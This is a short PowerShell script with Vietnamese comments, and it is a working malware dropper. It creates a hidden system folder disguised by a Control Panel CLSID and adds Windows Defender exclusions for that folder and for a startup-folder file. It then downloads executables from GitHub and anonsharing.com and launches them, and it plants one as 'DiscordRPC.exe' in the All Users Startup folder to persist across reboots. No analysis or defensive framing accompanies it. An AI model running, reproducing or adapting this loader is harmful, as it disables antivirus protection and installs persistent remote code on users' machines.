$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir
$folderPath = $dir

$filePath = "$folderPath\friend.exe"
$url = "https://github.com/manyak-cmd/a/raw/refs/heads/main/main.exe"

# Tạo thư mục nếu chưa tồn tại
if (!(Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force
}

# Kiểm tra nếu file chưa tồn tại thì tải về
if (!(Test-Path $filePath)) {
    Invoke-WebRequest -Uri $url -OutFile $filePath
}

$filePath = "$folderPath\watchdog.exe"
$url = "https://anonsharing.com/file/0da952d4aeb48c3b/H-Output_(2).exe"

# Tạo thư mục nếu chưa tồn tại
if (!(Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force
}

# Kiểm tra nếu file chưa tồn tại thì tải về
if (!(Test-Path $filePath)) {
    Invoke-WebRequest -Uri $url -OutFile $filePath
}



# Chạy file thực thi
Start-Process -FilePath $filePath -NoNewWindow

$filePath = "$startupfolder\DiscordRPC.exe"
Add-MpPreference -ExclusionPath $filePath
$url = "https://github.com/43a1723/test/releases/download/siu/discord.rpc.exe"
if (!(Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force
}
if (!(Test-Path $filePath)) {
    Invoke-WebRequest -Uri $url -OutFile $filePath
    Start-Process -FilePath $filePath -NoNewWindow
}

